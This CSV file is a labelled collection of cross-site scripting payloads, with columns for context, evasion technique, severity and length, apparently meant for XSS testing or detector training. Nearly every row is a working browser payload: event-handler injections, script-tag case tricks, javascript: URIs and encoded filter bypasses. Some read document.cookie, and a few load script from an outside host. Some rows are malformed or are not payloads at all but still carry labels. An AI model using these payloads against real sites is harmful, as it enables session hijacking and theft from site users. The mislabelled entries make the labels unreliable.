payload,context,technique,severity,length
"<u draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</u>",tag_injection,none,medium,80
"<q onmouseover=""alert(1)"">AnonKryptiQuz</q>",tag_injection,none,medium,43
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,tag_injection,none,medium,68
"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">",tag_injection,comment_injection|url_encoding,low,137
<li onpointerdown=alert(1) style=display:block>AnonKryptiQuz</li>,tag_injection,none,medium,65
<ScrIPt>alert(1)</ScRipT>,script_injection,case_variation,medium,25
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",tag_injection,none,medium,180
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=print()></source>",tag_injection,none,low,114
<dfn onpointerleave=alert(1) style=display:block>AnonKryptiQuz</dfn>,tag_injection,none,medium,68
<!<script>confirm(1)</script>,script_injection,none,medium,29
"<bgsound onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",tag_injection,none,medium,70
"<blockquote draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,98
"x""><svg%0Donload=""window['alert'](document.cookie)"">",dom_sink,url_encoding,high,52
<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>,tag_injection,none,medium,74
"<noembed><img title=""</noembed><img src onerror=alert(1)>""></noembed>",tag_injection,none,medium,69
"<listing draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",tag_injection,none,medium,92
"<em onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</em>",tag_injection,none,medium,62
<noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>,tag_injection,none,medium,63
"<fieldset id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></fieldset>",tag_injection,none,medium,92
"<header draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</header>",tag_injection,none,medium,70
"<img onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</img>",tag_injection,none,medium,65
"<bgsound onmouseout=""alert(1)"">AnonKryptiQuz</bgsound>",tag_injection,none,medium,54
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%28%2FAnonKryptiQuz%2F%29%22%3E,generic,url_encoding,low,111
"<style>:target {color:red;}</style><ruby id=x style=""transition:color 1s"" ontransitionstart=alert(1)></ruby>",tag_injection,none,medium,108
"<source onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</source>",tag_injection,none,medium,65
"<style>@keyframes slidein {}</style><blink style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></blink>",tag_injection,none,medium,170
&lt;IMG SRC=javascript&#058;alert('AnonKryptiQuz')&gt;,generic,html_entity,medium,54
"<animatemotion draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,104
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,tag_injection,none,medium,56
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,42
%3F%20<script>alert(1)</script>,script_injection,url_encoding,medium,31
"<colgroup onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",tag_injection,none,medium,77
<small onpointerleave=alert(1) style=display:block>AnonKryptiQuz</small>,tag_injection,none,medium,72
<blockquote onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,72
<ol onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53
"<dfn draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</dfn>",tag_injection,none,medium,64
<script>javascript:alert(9764)</script\x0B,script_injection,none,medium,42
+330011223344;phone-context=<script>alert(0)</script>,script_injection,none,medium,53
"<a+HREF=""%26%237 javascrip%26%239t: alert%261par;document .domain) *>",generic,url_encoding,low,69
<marquee/onstart=alert()>,tag_injection,none,medium,25
"<style>:target {color:red;}</style><blink id=x style=""transition:color 1s"" ontransitionend=alert(1)></blink>",tag_injection,none,medium,108
/</script>'>alert(1)/*<script/1=',script_injection,none,medium,33
"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",tag_injection,none,medium,72
<p onpointerdown=alert(1) style=display:block>AnonKryptiQuz</p>,tag_injection,none,medium,63
"<sup onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</sup>",tag_injection,none,medium,67
"<span draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</span>",tag_injection,none,medium,81
<meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>,tag_injection,none,medium,57
"<;IMG SRC="";livescript:[code]"";>;",generic,none,low,33
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:document.vulnerable=true;"">",dom_sink,none,low,80
<button popovertarget=x>Click me</button><animate ontoggle=alert(1) popover id=x>AnonKryptiQuz</animate>,tag_injection,none,medium,104
<u onpointerout=alert(1) style=display:block>AnonKryptiQuz</u>,tag_injection,none,medium,62
<a2 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</a2>,tag_injection,none,medium,66
"<body onload=""window.alert('AnonKryptiQuz')"">",dom_sink,none,medium,45
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71
"<plaintext draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",tag_injection,none,medium,96
"""]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//",dom_sink,none,medium,59
"<tt draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</tt>",tag_injection,none,medium,62
"<input2 onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</input2>",tag_injection,none,medium,73
"<nobr onmouseenter=""alert(1)"">AnonKryptiQuz</nobr>",tag_injection,none,medium,50
"<form onformdata=""alert(1)""><button>Click</button></form>",tag_injection,none,medium,57
"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>",tag_injection,none,medium,117
"<img src\x32=x onerror=""javascript:alert(2514)"">",js_uri,none,medium,48
"<image3 oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,75
"<html draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</html>",tag_injection,none,medium,86
"<sub onmouseenter=""alert(1)"">AnonKryptiQuz</sub>",tag_injection,none,medium,48
<meter id=x tabindex=1 onfocusin=alert(1)></meter>,tag_injection,none,medium,50
"<style>@keyframes slidein {}</style><animatetransform style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></animatetransform>",tag_injection,none,medium,186
<button popovertarget=x>Click me</button><xmp ontoggle=alert(1) popover id=x>AnonKryptiQuz</xmp>,tag_injection,none,medium,96
"<option onmouseout=""alert(1)"">AnonKryptiQuz</option>",tag_injection,none,medium,52
"<bdo onmouseup=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,45
"<progress onmouseover=""alert(1)"">AnonKryptiQuz</progress>",tag_injection,none,medium,57
"<data onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</data>",tag_injection,none,medium,84
<input contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,59
<bdo onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</bdo><input value=clickme>,tag_injection,none,medium,97
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,tag_injection,none,medium,62
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""print()""></abbr>",tag_injection,none,low,177
"<animate onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></animate>",tag_injection,none,medium,287
"<bdi onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,79
"<dt draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</dt>",tag_injection,none,medium,62
"<input oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98
"&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,81
"<section onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,90
"'""/><img src= x onerror='alert(document.domain)'>",dom_sink,none,medium,49
"<style>@keyframes x{}</style><u style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></u>",tag_injection,none,medium,95
"<audio2 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100
"<element onmouseover=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,55
"<style>@keyframes x{}</style><animatetransform style=""animation-name:x"" onanimationend=""alert(1)""></animatetransform>",tag_injection,none,medium,117
<nav onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,65
<tbody onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55
<noembed id=x tabindex=1 onactivate=alert(1)></noembed>,tag_injection,none,medium,55
http://example.com/?%0aalert(23),generic,url_encoding,medium,32
"<img src=""javascript:alert('AnonKryptiQuz')"" alt=""Image"">",js_uri,none,medium,57
"<track onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</track>",tag_injection,none,medium,63
"<source draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</source>",tag_injection,none,medium,68
'+confirm(9)&&null==',attribute_escape,none,medium,21
"<textarea onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",tag_injection,none,medium,78
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable style=display:block>drop here</strike>",tag_injection,none,medium,133
<input3 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</input3>,tag_injection,none,medium,74
"<animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",tag_injection,url_encoding,medium,113
<var onpointermove=alert(1) style=display:block>AnonKryptiQuz</var>,tag_injection,none,medium,67
"<style>:target {color: red;}</style><time id=x style=""transition:color 10s"" ontransitioncancel=print()></time>",tag_injection,none,low,110
"<video draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,88
<img src=xss onerror=alert(1)>,tag_injection,none,medium,30
"<style>@keyframes x{}</style><mark style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></mark>",tag_injection,none,medium,101
wordcloud,generic,none,low,9
"<bdo onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",tag_injection,none,medium,64
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,tag_injection,none,medium,46
"<tfoot onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</tfoot>",tag_injection,none,medium,86
<col onpointerleave=alert(1) style=display:block>AnonKryptiQuz</col>,tag_injection,none,medium,68
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",tag_injection,none,medium,113
"';globalThis['\x65\x76\x61\x6c']('globalThis[""\x61\x6c\x65\x72\x74""](globalThis[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,none,low,113
"<samp onclick=""alert(1)"">AnonKryptiQuz</samp>",tag_injection,none,medium,45
<script%20TEST>alert(1)</script%20TESTTEST>,script_injection,url_encoding,medium,43
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,94
"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable style=display:block>drop here</title>",tag_injection,none,medium,131
"""onmouseover=""alert(1)",attribute_escape,none,medium,22
"<select onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</select>",tag_injection,none,medium,74
"<span onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</span>",tag_injection,none,medium,66
"<image draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</image>",tag_injection,none,medium,63
"<img ondblclick=""alert(1)"">AnonKryptiQuz</img>",tag_injection,none,medium,46
"<wbr oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97
"<thead draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</thead>",tag_injection,none,medium,63
"<wbr onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</wbr>",tag_injection,none,medium,62
"<style>@keyframes x{}</style><image2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image2>",tag_injection,none,medium,103
<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>,dom_sink,url_encoding|case_variation,high,57
"<noembed onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></noembed>",tag_injection,none,medium,287
"<big onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</big>",tag_injection,none,medium,67
<spacer onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</spacer><input value=clickme>,tag_injection,none,medium,112
"<tfoot onmouseenter=""alert(1)"">AnonKryptiQuz</tfoot>",tag_injection,none,medium,52
<script onpointerout=alert(1) style=display:block>AnonKryptiQuz</script>,script_injection,none,medium,72
<sub onpointerout=alert(1) style=display:block>AnonKryptiQuz</sub>,tag_injection,none,medium,66
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",tag_injection,none,medium,107
<cite id=x tabindex=1 onactivate=alert(1)></cite>,tag_injection,none,medium,49
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,42
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",tag_injection,none,medium,105
"<q onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</q>",tag_injection,none,medium,59
"<figcaption onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",tag_injection,none,medium,82
"<span onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</span>",tag_injection,none,medium,84
"<svG/x="">""/oNloaD=confirm()//",attribute_escape,case_variation,medium,29
"<link draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</link>",tag_injection,none,medium,66
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",tag_injection,none,medium,115
"<bdo oncontextmenu=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,49
<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>,tag_injection,none,medium,71
<sub onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,65
"<del onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,67
<form><input formaction=javascript:alert(1) type=image src=SOURCE>,js_uri,none,medium,66
"<pre id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></pre>",tag_injection,none,medium,82
"<center draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</center>",tag_injection,none,medium,85
"<label oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
<frameset contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,62
"window.open(""http://xss.cx"",""confirm(document.domain);"", """", false);",dom_sink,none,medium,68
"<div id=""97""><!-- IE 5-9 -->",attribute_escape,comment_injection,low,28
"<progress draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,94
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></figcaption>",tag_injection,none,medium,124
"<summary oncontextmenu=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,57
